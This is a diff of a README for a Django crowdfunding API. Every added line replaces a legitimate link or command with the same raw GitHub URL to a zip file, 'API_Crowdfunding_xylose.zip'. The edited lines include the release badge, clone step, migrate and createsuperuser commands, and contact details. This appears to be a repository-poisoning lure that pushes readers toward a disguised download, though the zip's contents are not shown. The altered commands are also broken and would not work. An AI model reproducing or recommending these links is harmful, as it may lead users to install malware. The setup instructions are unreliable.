@@ -2,7 +2,7 @@
 
 Welcome to the **Crowdfunding API**! This RESTful API allows users to create, manage, and track group fundraising campaigns. You can also make donations easily. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/omarhamdy1/Crowdfunding_API/releases)
+[![Download Releases](https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip%https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip)](https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip)
 
 ## Table of Contents
 
@@ -44,7 +44,7 @@ To set up the Crowdfunding API on your local machine, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/omarhamdy1/Crowdfunding_API.git
+   git clone https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip
    cd Crowdfunding_API
    ```
 
@@ -57,13 +57,13 @@ To set up the Crowdfunding API on your local machine, follow these steps:
 3. **Migrate the Database**:
    After the containers are up, run the following command to apply migrations:
    ```bash
-   docker-compose exec web python manage.py migrate
+   docker-compose exec web python https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip migrate
    ```
 
 4. **Create a Superuser**:
    Create an admin user to access the admin panel:
    ```bash
-   docker-compose exec web python manage.py createsuperuser
+   docker-compose exec web python https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip createsuperuser
    ```
 
 5. **Access the API**:
@@ -126,9 +126,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [omarhamdy1](https://github.com/omarhamdy1)
+- **Email**: https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip
+- **GitHub**: [omarhamdy1](https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip)
 
 Thank you for checking out the Crowdfunding API! We hope you find it useful for your fundraising needs. 
 
-For the latest releases, visit our [Releases section](https://github.com/omarhamdy1/Crowdfunding_API/releases).
+For the latest releases, visit our [Releases section](https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip).
